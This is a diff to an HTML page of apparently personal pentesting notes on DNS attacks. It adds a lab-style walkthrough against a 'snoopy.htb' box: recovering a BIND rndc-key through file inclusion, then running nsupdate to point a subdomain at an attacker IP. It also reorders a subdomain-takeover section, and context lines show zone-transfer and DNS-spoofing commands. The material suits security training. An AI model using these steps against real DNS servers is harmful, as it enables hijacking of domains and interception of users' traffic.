@@ -59,15 +59,7 @@
                 <pre><code class="language-bash">dig axfr @DNS_IP DOMAIN #Try zone transfer guessing the domain</code></pre> 
                 <pre><code class="language-bash">fierce --domain DOMAIN --dns-servers DNS_IP #Will try toperform a zone transfer against every authoritative name server and if this doesn'twork, will launch a dictionary attack</code></pre>    
                 </ul>    
-
-                <h3>Subdomain takeover</h3>
-                <ul>
-                <p>Let's supose the following situation:</p>
-                <p>A company has a external resource which is linked to a subdomain called blog.mycompany.com. This can be configured in the CNAME property of the DNS.</p>
-                <p>In case this external resource becomes unavailable an attacker could create a new resource with the same domain and put it's own page</p>
-                <p>Since the DNS of our company is still configured with the CNAME it will detect that the resource is now available and will resolve the attacker website</p>
-                </ul> 
-
+                
                 <h3>Local DNS Cache Poisoning</h3>
                 <ul>
                 <p>This is a way of poisoning DNS of a victim to make the user resolve the address of the attacker instead of the real address that the user is requesting</p>
@@ -82,6 +74,54 @@ inlanefreight.com      A   192.168.225.110
                 <p><b>Add target 2:</b> Gateway address</p>
                 <p>Finally go to the plugin section and enable the dns_spoof to being poisoning</p>
                 </ul> 
+
+                <h3>DNZ zone update</h3>
+                <ul>
+                    <p>This attack consits in updating the DNS records in order to setup domains which were not there. <b>But to do so there are certain requisites which must be fullfiled</b></p>
+                    <p>First of all we need to check the following file. This can be done using Local File Inclusion attack or in case you found any export of the file or other</p>
+                    <p>Second we must ensure that the DNS server we are attacking uses bind</p>
+                    <pre><code class="language-bash">/etc/bind/named.conf.options</code></pre>
+                    <p>Inside this file we will find the following</p>
+                    <pre><code class="language-bash">include "/etc/bind/named.conf.options";
+include "/etc/bind/named.conf.local";
+include "/etc/bind/named.conf.default-zones";
+
+key "rndc-key" {
+    algorithm hmac-sha256;
+    secret "BEqUtce80uhu3TOEGJJaMlSx9WT2pkdeCtzBeDykQQA=";
+};</code></pre>
+                    <p>To have it clear the <b>rndc-key</b> which is an authentication key used by bind (the DNS server) in order to allow the secure communication between the RNDC (Remote Name Deamon Control) which allows the remote administration of the DNS server</p>
+                    <p>If we keep looking at the included files we can read the <b>named.conf.local</b> which shows the following content</p>
+                    <pre><code class="language-bash">zone "snoopy.htb" IN {
+    type master;
+    file "/var/lib/bind/db.snoopy.htb";
+    allow-update { key "rndc-key"; };
+    allow-transfer { 10.0.0.0/8; };
+};</code></pre>
+                    <p>The important part here is the <b>allow-update { key "rndc-key"; }</b> parameter which as it is stablished it allow us to perform changes in the DNS records providing the RNDC key</p>
+                    <p>To exploit this we need to create a file when we load the configuration. As we can see in this case we are adding the domain mail.snoopy.htb</p>
+                    <pre><code class="language-bash">server #VICTIM_IP
+zone snoopy.htb
+update add mail.snoopy.htb 86400 IN A #ATTACKER_IP
+send</code></pre>
+                    <p>And another file with the RNDC key. Just as following</p>     
+                    <pre><code class="language-bash">key "rndc-key" {
+    algorithm hmac-sha256;
+    secret "BEqUtce80uhu3TOEGJJaMlSx9WT2pkdeCtzBeDykQQA=";
+};</code></pre>    
+                   <p>Finally use the following command in order to update the  DNS records</p>
+                   <pre><code class="language-bash">nsupdate -k rndc.key poison_dns.txt</code></pre>
+                   <b>Now with the DNS record added we could be able to make work certain part of a website which was not loading since it was requesting a domain that was not setup</b>
+                </ul>
+
+                <h3>Subdomain takeover</h3>
+                <ul>
+                <p>Let's supose the following situation:</p>
+                <p>A company has a external resource which is linked to a subdomain called blog.mycompany.com. This can be configured in the CNAME property of the DNS.</p>
+                <p>In case this external resource becomes unavailable an attacker could create a new resource with the same domain and put it's own page</p>
+                <p>Since the DNS of our company is still configured with the CNAME it will detect that the resource is now available and will resolve the attacker website</p>
+                </ul> 
+
 
                 <h3>Subdomain enumeration</h3>
                 <ul>
